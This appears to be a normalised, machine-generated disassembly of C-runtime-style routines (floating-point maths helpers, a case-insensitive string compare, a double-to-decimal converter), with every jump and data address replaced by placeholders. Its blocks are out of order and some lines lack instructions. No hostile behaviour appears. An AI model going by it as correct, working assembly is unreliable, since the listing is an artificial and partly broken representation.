movlpd xmm1 [ esp + 0xc ]
pextrw eax xmm1 0x3
and eax 0x8000
cmp eax 0x0
je r-xdata
movlpd xmm1 [ esp + 0xc ]
movlpd xmm2 [ esp + 0xc ]
mov ecx 0x3f4
movd xmm3 ecx
andpd xmm1 [ r--data ]
psrlq xmm1 0x34
psubd xmm1 xmm3
pxor xmm3 xmm3
psllq xmm2 xmm1
pcmpeqd xmm2 xmm3
pmovmskb eax xmm2
and eax 0xff
cmp eax 0xff
je r-xdata
mov edx 0x19
cmp eax 0x0
je r-xdata
mov edx 0x19
cmp eax 0x0
je r-xdata
fldz
retn
movlpd xmm1 [ esp + 0xc ]
pextrw eax xmm1 0x3
and eax 0x8000
cmp eax 0x0
je r-xdata
sub esp 0x10
movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
sub esp 0x10
movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
fld [ r--data ]
retn
sub_424590
mov [ ebp - 0x90 ] 0xfe
or ch ch
jne r-xdata
call sub_424721
or eax eax
je r-xdata
fxch st1
jmp sub_424943
xor ch ch
cmp eax 0x2
je r-xdata
call sub_4246de
fld1
faddp st1
test [ ebp - 0x9f ] 0x1
je r-xdata
fxch st1
fabs
jmp r-xdata
not ch
test dl 0x40
jne r-xdata
fld1
fdivrp st1
fyl2x
jmp r-xdata
or ch ch
je r-xdata
fscale
jmp sub_424888
fchs
sub_4245a1
mov [ ebp - 0x90 ] 0xfe
xor ch ch
fldl2e
fmulp st1
call sub_4246de
fld1
faddp st1
test [ ebp - 0x9f ] 0x1
je r-xdata
test dl 0x40
jne r-xdata
fld1
fdivrp st1
or ch ch
je r-xdata
fscale
jmp sub_424888
fchs
sub_42464d
call sub_424721
fstp st0
fstp st0
or cl cl
jne r-xdata
mov [ ebp - 0x90 ] 0x2
fld [ r--data ]
cmp eax 0x1
jne r-xdata
fldz
cmp eax 0x1
jne r-xdata
retn
or ch ch
je r-xdata
or ch ch
je r-xdata
fchs
jmp r-xdata
fchs
sub_4246de
fld st0
fabs
fld [ r--data ]
fcompp
fwait
fnstsw [ ebp - 0xa0 ]
fwait
test [ ebp - 0x9f ] 0x41
jne r-xdata
pop eax
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fwait
test [ ebp - 0x9f ] 0x1
jne r-xdata
fld st0
frndint
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fwait
mov dl [ ebp - 0x9f ]
fxch st1
fsub st1
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fabs
f2xm1
retn
mov [ ebp - 0x90 ] 0x4
jmp sub_424896
fstp st0
fld [ r--data ]
or ch ch
je r-xdata
retn
fchs
sub_424721
fld st0
frndint
fcomp st1
fwait
fnstsw ax
sahf
jne r-xdata
mov eax 0x0
jmp r-xdata
fld st0
fmul [ r--data ]
fld st0
frndint
fcompp
fwait
fnstsw ax
sahf
je r-xdata
retn
mov eax 0x2
jmp r-xdata
mov eax 0x1
sub_424755
push esi
sub esp 0x74
mov esi esp
push esi
sub esp 0x8
fstp [ esp ]
sub esp 0x8
fstp [ esp ]
fwait
fnsave [ esi + 0x8 ]
call sub_424be6
add esp 0x14
frstor [ esi + 0x8 ]
fld [ esi ]
add esp 0x74
pop esi
test eax eax
je r-xdata
retn
jmp sub_424956
sub_424790
cmp [ edx + 0xe ] 0x5
jne r-xdata
mov bx 0x133f
mov bx [ ebp - 0xa4 ]
or bh 0x2
and bh 0xfe
mov bl 0x3f
jmp r-xdata
mov [ ebp - 0xa2 ] bx
fldcw [ ebp - 0xa2 ]
mov ebx r--data
fxam
mov [ ebp - 0x94 ] edx
fwait
fnstsw [ ebp - 0xa0 ]
mov [ ebp - 0x90 ] 0x0
fwait
mov cl [ ebp - 0x9f ]
shl cl 0x1
sar cl 0x1
rol cl 0x1
mov al cl
and al 0xf
xlat
movsx eax al
and ecx 0x404
mov ebx edx
add ebx eax
add ebx 0x10
jmp [ ebx ]
sub_424904
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x1
fxch st1
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x0
jmp r-xdata
faddp st1
retn
sub_424990
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
fstp [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push edx
call sub_428b27
add esp 0xc
fld [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x27f
je r-xdata
leave
retn
fldcw [ ebp + 0x8 ]
sub_4249a7
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x20 ] eax
fstp [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push edx
call sub_428b27
add esp 0xc
fld [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x27f
je r-xdata
leave
retn
fldcw [ ebp + 0x8 ]
sub_424a35
mov eax [ edx + 0x4 ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
mov eax [ edx + 0x4 ]
sub esp 0xa
or eax 0x7fff0000
mov [ esp + 0x6 ] eax
mov eax [ edx + 0x4 ]
mov ecx [ edx ]
shld eax ecx 0xb
shl ecx 0xb
mov [ esp + 0x4 ] eax
mov [ esp ] ecx
fld [ esp ]
add esp 0xa
test eax 0x0
mov eax [ edx + 0x4 ]
retn
fld [ edx ]
retn
sub_424b7c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_4239af
pop ecx
pop ecx
test al 0x90
jne r-xdata
xor eax eax
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_428c32
fld [ ebp + 0x8 ]
fucom st1
fnstsw ax
pop ecx
pop ecx
fstp st1
test ah 0x44
jpe r-xdata
fstp st0
fmul [ r--data ]
push ecx
push ecx
fst [ ebp - 0x8 ]
fstp [ esp ]
call sub_428c32
fld [ ebp - 0x8 ]
fucompp
fnstsw ax
pop ecx
pop ecx
test ah 0x44
jpe r-xdata
xor eax eax
inc eax
jmp r-xdata
push 0x2
pop eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_424be6
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
mov ecx 0x7ff00000
fabs
mov eax 0xfff00000
cmp [ ebp + 0x14 ] ecx
jne r-xdata
cmp [ ebp + 0x14 ] eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
fstp st0
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
fld1
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
cmp [ ebp + 0xc ] eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
fld1
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
fcom st1
fnstsw ax
fstp st1
test ah 0x41
mov eax [ ebp + 0x18 ]
jne r-xdata
fstp st1
fstp st0
fld [ r--data ]
jmp r-xdata
xor eax eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
fldz
fld [ ebp + 0x10 ]
fcom st1
fnstsw ax
test ah 0x41
je r-xdata
fcom st1
fnstsw ax
fstp st1
test ah 0x41
mov eax [ ebp + 0x18 ]
jne r-xdata
fstp st1
fstp st0
fldz
jmp r-xdata
fstp [ eax ]
fstp st0
fldz
jmp r-xdata
mov eax [ ebp + 0x18 ]
fld [ ebp + 0x10 ]
push ecx
push ecx
fstp [ esp ]
call sub_424b7c
fldz
fld [ ebp + 0x10 ]
pop ecx
pop ecx
fcom st1
mov ecx eax
fnstsw ax
test ah 0x41
jne r-xdata
fcomp st1
fnstsw ax
test ah 0x5
mov eax [ ebp + 0x18 ]
jpo r-xdata
fstp st0
fld [ r--data ]
jmp r-xdata
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fld [ r--data ]
cmp ecx 0x1
jne r-xdata
fstp st0
fld1
jmp r-xdata
fstp st0
fld1
cmp ecx 0x1
jne r-xdata
fchs
jmp r-xdata
fstp st0
fld [ r--data ]
jmp r-xdata
sub_424d11
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_424da6
add esp 0xc
pop ebp
retn
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
mov eax 0x7fffffff
pop ebp
retn
push ebx
push esi
push edi
push 0x41
pop edi
push 0x5a
sub edx ecx
pop ebx
mov esi eax
cmp ax bx
ja r-xdata
add ecx 0x2
test si si
je r-xdata
cmp ax bx
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
movzx ecx ax
pop edi
movzx eax si
pop esi
sub eax ecx
pop ebx
pop ebp
retn
cmp si ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax di
jb r-xdata
movzx eax [ edx + ecx ]
cmp ax di
jb r-xdata
sub_424da6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push ebx
push esi
push [ ebp + 0x10 ]
call sub_414048
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
mov edx 0x7fffffff
jmp r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
pop esi
pop ebx
je r-xdata
mov eax [ ebp - 0xc ]
push edi
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax edx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
movzx eax [ ebx ]
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_428c48
lea ecx [ ebp - 0xc ]
movzx edi ax
movzx eax [ esi ]
lea ebx [ ebx + 0x2 ]
push ecx
push eax
call sub_428c48
add esp 0x10
movzx eax ax
lea esi [ esi + 0x2 ]
test di di
je r-xdata
push 0x41
pop ecx
push 0x5a
sub ebx esi
pop edx
movzx edx di
movzx eax ax
sub edx eax
pop edi
cmp di ax
je r-xdata
mov edi eax
cmp ax dx
ja r-xdata
add esi 0x2
test di di
je r-xdata
cmp ax dx
ja r-xdata
add eax 0x20
movzx edi ax
jmp r-xdata
cmp di ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ esi ]
cmp ax cx
jb r-xdata
movzx eax [ ebx + esi ]
cmp ax cx
jb r-xdata
jmp r-xdata
sub_424e86
mov edi edi
push ebp
mov ebp esp
lea eax [ ecx + 0x4 ]
mov edx eax
sub edx ecx
add edx 0x3
push esi
xor esi esi
shr edx 0x2
cmp eax ecx
sbb eax eax
not eax
and eax edx
je r-xdata
pop esi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
inc esi
mov [ ecx ] edx
lea ecx [ ecx + 0x4 ]
cmp esi eax
jne r-xdata
sub_424eee
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
call sub_41529e
push 0x16
mov ecx [ ebp + 0x10 ]
mov [ edx ] 0x0
test ecx ecx
jle r-xdata
pop esi
pop ebp
retn
xor eax eax
mov eax ecx
jmp r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
je r-xdata
call sub_41529e
push 0x22
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
push ebx
lea ebx [ edx + 0x1 ]
mov eax ebx
push edi
mov edi [ esi + 0x8 ]
mov [ edx ] 0x30
test ecx ecx
jle r-xdata
pop esi
mov [ eax ] esi
call sub_413b01
mov eax esi
jmp r-xdata
mov [ eax ] 0x0
test ecx ecx
js r-xdata
mov bl [ edi ]
test bl bl
je r-xdata
cmp [ edx ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
mov bl 0x30
inc edi
jmp r-xdata
mov ecx ebx
lea esi [ ecx + 0x1 ]
inc [ esi + 0x4 ]
jmp r-xdata
jmp r-xdata
lea ebx [ edx + 0x1 ]
mov [ eax ] bl
inc eax
dec ecx
test ecx ecx
jg r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx esi
lea eax [ ecx + 0x1 ]
push eax
push ebx
push edx
call sub_410380
add esp 0xc
pop edi
xor eax eax
pop ebx
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_424faa
mov edi edi
push esi
mov esi ecx
push esi
call sub_428d11
mov eax [ esi ]
and eax 0x1f
pop ecx
cmp al 0x1f
jne r-xdata
push esi
call sub_428d77
pop ecx
mov [ esi + 0x8 ] 0x1
mov [ esi + 0x8 ] 0x0
jmp r-xdata
mov eax esi
pop esi
retn
sub_424fd4
mov edi edi
push ebp
mov ebp esp
sub esp 0x964
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x18 ]
lea ecx [ ebp - 0x794 ]
push esi
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x780 ] edi
mov [ ebp - 0x77c ] ebx
call sub_424faa
mov esi [ ebp + 0xc ]
xor eax eax
mov ecx esi
and ecx 0x80000000
or eax ecx
mov al 0x2d
jne r-xdata
movsx eax al
mov ecx esi
mov [ edi ] eax
and ecx 0x7ff00000
xor eax eax
mov [ edi + 0x8 ] ebx
or eax ecx
mov edi [ ebp + 0x8 ]
jne r-xdata
add al 0xf3
lea eax [ ebp + 0x8 ]
push eax
call sub_41aeba
pop ecx
test eax eax
je r-xdata
mov ecx esi
mov eax edi
and ecx 0xfffff
or eax ecx
jne r-xdata
sub eax 0x1
je r-xdata
mov ecx [ ebp - 0x780 ]
mov [ ecx + 0x4 ] 0x1
mov eax [ ebp - 0x780 ]
push r--data
and [ eax + 0x4 ] 0x0
jmp r-xdata
push r--data
sub eax 0x1
je r-xdata
push [ ebp + 0x1c ]
push ebx
call sub_414f1a
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413b2e
int3
cmp [ ebp - 0x78c ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
push r--data
jmp r-xdata
sub eax 0x1
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x794 ]
push eax
call sub_428d2e
pop ecx
push r--data
jmp r-xdata
sub eax 0x1
je r-xdata
push r--data
jmp r-xdata
mov eax [ ebp + 0x10 ]
and esi 0x7fffffff
and [ ebp - 0x784 ] 0x0
inc eax
mov [ ebp + 0x8 ] edi
mov [ ebp + 0xc ] esi
fld [ ebp + 0x8 ]
fst [ ebp - 0x768 ]
mov edi [ ebp - 0x764 ]
mov ecx edi
mov [ ebp - 0x778 ] eax
shr ecx 0x14
mov eax ecx
and eax 0x7ff
or eax 0x0
jne r-xdata
xor dl dl
mov esi 0x100000
xor eax eax
mov dl 0x1
xor esi esi
jmp r-xdata
xor eax eax
mov [ ebp - 0x76c ] eax
cmp eax 0x80000000
jne r-xdata
mov ebx [ ebp - 0x768 ]
and edi 0xfffff
add ebx eax
adc edi esi
xor eax eax
test dl dl
setne al
and ecx 0x7ff
inc eax
lea esi [ ecx - 0x434 ]
add esi eax
mov [ ebp - 0x74c ] esi
call sub_428e10
push ecx
push ecx
fstp [ esp ]
call sub_428f20
pop ecx
pop ecx
call sub_429cf0
mov [ ebp - 0x76c ] eax
cmp eax 0x7fffffff
je r-xdata
cmp esi 0xfffffc02
je r-xdata
and [ ebp - 0x570 ] 0x0
push 0x2
pop esi
mov [ ebp - 0x56c ] 0x100000
mov [ ebp - 0x574 ] esi
cmp ebx esi
jne r-xdata
mov [ ebp - 0x1d0 ] ebx
xor ebx ebx
test edi edi
mov [ ebp - 0x1cc ] edi
setne bl
inc ebx
mov [ ebp - 0x1d4 ] ebx
test esi esi
js r-xdata
mov eax [ ebp + ebx * 4 - 0x1d4 ]
and [ ebp - 0x764 ] 0x0
bsr eax eax
je r-xdata
and [ ebp - 0x570 ] 0x0
push 0x2
pop ecx
mov [ ebp - 0x56c ] 0x100000
mov [ ebp - 0x574 ] ecx
cmp ebx ecx
jne r-xdata
mov eax [ ebp - 0x74c ]
xor edx edx
inc eax
mov edi eax
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov [ ebp - 0x750 ] eax
xor eax eax
shr edi 0x5
inc eax
mov [ ebp - 0x74c ] edi
mov [ ebp - 0x770 ] ecx
call sub_429af0
mov ecx [ ebp + ebx * 4 - 0x1d4 ]
dec eax
and [ ebp - 0x764 ] 0x0
bsr ecx ecx
mov [ ebp - 0x758 ] eax
not eax
mov [ ebp - 0x774 ] eax
je r-xdata
xor ecx ecx
xor ecx ecx
lea ecx [ eax + 0x1 ]
jmp r-xdata
xor edx edx
xor ecx ecx
inc ecx
jmp r-xdata
add ecx 0x4
cmp ecx 0x8
jne r-xdata
xor al al
test al al
je r-xdata
push 0x20
pop eax
sub eax ecx
cmp eax 0x1
setb al
cmp ebx 0x73
mov [ ebp - 0x745 ] al
seta cl
cmp ebx 0x73
jne r-xdata
add edx 0x4
cmp edx 0x8
jne r-xdata
xor al al
test al al
je r-xdata
push 0x20
pop eax
sub eax ecx
lea edx [ ebx + edi ]
cmp [ ebp - 0x750 ] eax
mov [ ebp - 0x760 ] edx
seta al
cmp edx 0x73
mov [ ebp - 0x745 ] al
seta cl
cmp edx 0x73
jne r-xdata
mov eax [ ebp + ecx - 0x570 ]
cmp eax [ ebp + ecx - 0x1d0 ]
jne r-xdata
mov eax [ ebp - 0x74c ]
xor edx edx
add eax 0x2
mov esi eax
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov [ ebp - 0x75c ] eax
xor eax eax
shr esi 0x5
inc eax
mov [ ebp - 0x750 ] esi
mov [ ebp - 0x770 ] ecx
call sub_429af0
and [ ebp - 0x764 ] 0x0
dec eax
bsr ecx edi
mov [ ebp - 0x758 ] eax
not eax
mov [ ebp - 0x774 ] eax
je r-xdata
and [ ebp - 0x574 ] 0x0
lea eax [ ebp - 0x570 ]
and [ ebp - 0x1d4 ] 0x0
push 0x0
push eax
lea eax [ ebp - 0x1d0 ]
push 0x1cc
push eax
call sub_41ed6e
add esp 0x10
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + edx - 0x570 ]
cmp eax [ ebp + edx - 0x1d0 ]
jne r-xdata
and [ ebp - 0x764 ] 0x0
bsr eax edi
je r-xdata
xor eax eax
mov ebx 0x1cc
push eax
mov [ ebp - 0x574 ] eax
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x570 ]
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_41ed6e
add esp 0x10
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
xor ecx ecx
inc ecx
jmp r-xdata
neg eax
div ecx
mov [ ebp - 0x754 ] eax
mov ecx edx
mov [ ebp - 0x758 ] ecx
test eax eax
je r-xdata
div ecx
mov [ ebp - 0x770 ] eax
mov ecx edx
mov [ ebp - 0x764 ] ecx
test eax eax
je r-xdata
push 0x72
pop ecx
cmp ebx ecx
jae r-xdata
test cl cl
jne r-xdata
xor edx edx
lea edx [ eax + 0x1 ]
jmp r-xdata
lea eax [ ebp - 0x570 ]
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_41ed6e
add esp 0x10
jmp r-xdata
push 0x72
pop ecx
cmp edx ecx
jb r-xdata
test cl cl
jne r-xdata
xor al al
test al al
je r-xdata
push 0x20
pop eax
sub eax ecx
lea edx [ esi + 0x2 ]
cmp [ ebp - 0x75c ] eax
mov [ ebp - 0x754 ] edx
seta al
cmp edx 0x73
mov [ ebp - 0x745 ] al
seta cl
cmp edx 0x73
jne r-xdata
test ecx ecx
je r-xdata
cmp eax 0x26
jbe r-xdata
test ecx ecx
je r-xdata
cmp eax 0x26
jbe r-xdata
cmp ecx 0xffffffff
je r-xdata
mov ecx ebx
and [ ebp - 0x750 ] 0x0
mov edx [ edi ]
mov [ ebp - 0x750 ] edx
jmp r-xdata
push 0x20
pop eax
sub eax edx
mov esi ecx
cmp eax ecx
lea eax [ ebp - 0x1c8 ]
mov [ ebp - 0x754 ] eax
mov edi eax
setb [ ebp - 0x745 ]
mov eax [ ebp - 0x76c ]
xor edx edx
push 0xa
pop ecx
mov [ ebp - 0x774 ] ecx
test eax eax
js r-xdata
mov eax edx
mov [ ebp - 0x754 ] eax
cmp edx 0xffffffff
je r-xdata
mov edx ecx
mov [ ebp - 0x760 ] ecx
xor eax eax
mov ebx 0x1cc
push eax
mov [ ebp - 0x574 ] eax
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x570 ]
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_41ed6e
add esp 0x10
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
mov edi [ ebp - 0x77c ]
mov esi edi
mov ecx [ ebp - 0x1d4 ]
mov [ ebp - 0x74c ] esi
test ecx ecx
je r-xdata
mov eax [ ecx * 4 + r--data ]
mov [ ebp - 0x764 ] eax
test eax eax
je r-xdata
movzx ecx [ eax * 4 + r--data ]
movzx esi [ eax * 4 + r--data ]
mov edi ecx
mov [ ebp - 0x74c ] eax
shl edi 0x2
push edi
lea eax [ ecx + esi ]
mov [ ebp - 0x574 ] eax
lea eax [ ebp - 0x570 ]
push 0x0
push eax
call sub_411230
mov eax esi
shl eax 0x2
push eax
mov eax [ ebp - 0x74c ]
movzx eax [ eax * 4 + r--data ]
lea eax [ eax * 4 + r--data ]
push eax
lea eax [ ebp - 0x570 ]
add eax edi
push eax
call sub_4117a0
mov ecx [ ebp - 0x574 ]
add esp 0x18
mov [ ebp - 0x760 ] ecx
cmp ecx 0x1
ja r-xdata
push 0x26
pop eax
mov edi [ ecx * 4 + r--data ]
test edi edi
jne r-xdata
movzx ecx [ eax * 4 + r--data ]
movzx esi [ eax * 4 + r--data ]
mov edi ecx
mov [ ebp - 0x75c ] eax
shl edi 0x2
push edi
lea eax [ ecx + esi ]
mov [ ebp - 0x574 ] eax
lea eax [ ebp - 0x570 ]
push 0x0
push eax
call sub_411230
mov eax esi
shl eax 0x2
push eax
mov eax [ ebp - 0x75c ]
movzx eax [ eax * 4 + r--data ]
lea eax [ eax * 4 + r--data ]
push eax
lea eax [ ebp - 0x570 ]
add eax edi
push eax
call sub_4117a0
mov ecx [ ebp - 0x574 ]
add esp 0x18
mov [ ebp - 0x760 ] ecx
cmp ecx 0x1
ja r-xdata
push 0x26
pop eax
cmp [ ebp - 0x745 ] 0x0
je r-xdata
lea edi [ ebp - 0x1d0 ]
mov esi ecx
lea edi [ edi + ecx * 4 ]
mov [ ebp - 0x754 ] edi
xor edx edx
mov edx [ edi - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ebx
jae r-xdata
test edi edi
je r-xdata
mov esi edx
lea ecx [ ebp - 0x1d0 ]
mov edx [ ebp - 0x74c ]
sub esi edx
lea ecx [ ecx + esi * 4 ]
mov [ ebp - 0x75c ] ecx
push 0x72
pop ecx
cmp edx ecx
jb r-xdata
test cl cl
jne r-xdata
lea eax [ ebp - 0x3a4 ]
push eax
lea eax [ ebp - 0x1d4 ]
push eax
call sub_419c00
pop ecx
pop ecx
push 0xa
pop edx
cmp eax edx
jne r-xdata
xor esi esi
xor edi edi
xor eax eax
push eax
mov [ ebp - 0x1d4 ] eax
mov [ ebp - 0x964 ] eax
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x1d4 ] 0x1
ja r-xdata
mov edi [ ebp - 0x570 ]
test edi edi
jne r-xdata
cmp edi 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x3a4 ] eax
push eax
jmp r-xdata
cmp [ ebp - 0x3a4 ] 0x1
ja r-xdata
mov edi [ ebp - 0x570 ]
test edi edi
jne r-xdata
mov [ ebp - 0x1d4 ] ecx
jmp r-xdata
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x1d4 ] eax
jmp r-xdata
and [ ebp - 0x750 ] 0x0
mov edx [ edi ]
mov [ ebp - 0x750 ] edx
jmp r-xdata
xor eax eax
cmp [ ebp - 0x745 ] al
setne al
add eax ecx
sub ecx [ ebp - 0x74c ]
mov edi ecx
mov [ ebp - 0x1d4 ] eax
shr edi 0x5
lea eax [ ebp - 0x570 ]
mov esi edi
mov [ ebp - 0x758 ] ecx
shl esi 0x2
push esi
push 0x0
push eax
call sub_411230
mov ecx [ ebp - 0x758 ]
xor eax eax
inc eax
and ecx 0x1f
shl eax cl
mov [ ebp + esi - 0x570 ] eax
lea eax [ edi + 0x1 ]
jmp r-xdata
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
mov eax [ ebp - 0x750 ]
sub edi 0x4
shl eax 0x2
shr edx 0x1e
xor edx eax
mov eax [ ebp - 0x754 ]
dec esi
mov [ eax ] edx
sub eax 0x4
mov [ ebp - 0x754 ] eax
cmp esi 0xffffffff
je r-xdata
cmp [ ebp - 0x745 ] 0x0
mov ebx 0x1cc
je r-xdata
mov ecx edi
xor eax eax
lea edi [ ebp - 0x1d0 ]
[ edi ]
mov edx [ ebp - 0x760 ]
mov edi [ ebp - 0x74c ]
push 0x2
pop esi
cmp esi ebx
jae r-xdata
mov ecx edx
mov [ ebp - 0x760 ] ecx
cmp edx 0xffffffff
je r-xdata
mov edx ecx
mov [ ebp - 0x754 ] ecx
test eax eax
jne r-xdata
inc [ ebp - 0x76c ]
lea esi [ edi + 0x1 ]
mov eax [ ebp - 0x3a4 ]
mov [ edi ] 0x31
mov [ ebp - 0x74c ] esi
test eax eax
je r-xdata
mov eax [ ebp + edi * 4 - 0x1d0 ]
push 0xa
pop edx
mul edx
add eax esi
mov [ ebp + edi * 4 - 0x1d0 ] eax
adc edx 0x0
inc edi
mov esi edx
cmp edi ecx
jne r-xdata
mov [ ebp - 0x764 ] esi
test esi esi
mov esi [ ebp - 0x74c ]
je r-xdata
mov ecx [ ebp - 0x1d4 ]
test ecx ecx
je r-xdata
cmp ecx [ ebp - 0x1d4 ]
lea edi [ ebp - 0x570 ]
setb al
test al al
jne r-xdata
mov edi [ ebp - 0x1d0 ]
mov eax ecx
shl eax 0x2
push eax
lea eax [ ebp - 0x570 ]
mov [ ebp - 0x1d4 ] ecx
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_41ed6e
add esp 0x10
test edi edi
je r-xdata
cmp edi 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x1d4 ] eax
push eax
lea eax [ ebp - 0x960 ]
jmp r-xdata
mov eax [ ebp - 0x3a4 ]
mov [ ebp - 0x764 ] eax
test eax eax
je r-xdata
lea eax [ ebp - 0x960 ]
push eax
lea eax [ ebp - 0x3a0 ]
jmp r-xdata
cmp ecx [ ebp - 0x3a4 ]
lea edi [ ebp - 0x570 ]
setb al
test al al
jne r-xdata
mov edi [ ebp - 0x3a0 ]
mov eax ecx
shl eax 0x2
push eax
lea eax [ ebp - 0x570 ]
mov [ ebp - 0x3a4 ] ecx
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_41ed6e
add esp 0x10
test edi edi
jne r-xdata
cmp edi 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x744 ] eax
mov [ ebp - 0x3a4 ] eax
jmp r-xdata
xor edi edi
lea eax [ ebp - 0x570 ]
inc edi
sub edi esi
mov ebx edi
shr ebx 0x5
mov esi ebx
shl esi 0x2
push esi
push 0x0
push eax
call sub_411230
xor eax eax
and edi 0x1f
inc eax
mov ecx edi
shl eax cl
mov [ ebp + esi - 0x570 ] eax
lea eax [ ebx + 0x1 ]
xor edx edx
mov edx [ edi - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ebx
jae r-xdata
mov [ ebp - 0x574 ] eax
mov ebx 0x1cc
mov [ ebp - 0x3a4 ] eax
shl eax 0x2
push eax
lea eax [ ebp - 0x570 ]
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_41ed6e
add esp 0x1c
cmp esi ebx
jae r-xdata
mov [ ebp - 0x1d4 ] edx
jmp r-xdata
lea eax [ edx + 0x1 ]
mov [ ebp - 0x1d4 ] eax
jmp r-xdata
xor edi edi
mov edi [ ecx ]
jmp r-xdata
test esi esi
je r-xdata
mov esi edx
lea eax [ ebp - 0x1d0 ]
mov edx [ ebp - 0x750 ]
sub esi edx
lea eax [ eax + esi * 4 ]
mov [ ebp - 0x74c ] eax
add al 0x30
lea esi [ edi + 0x1 ]
mov [ edi ] al
mov [ ebp - 0x74c ] esi
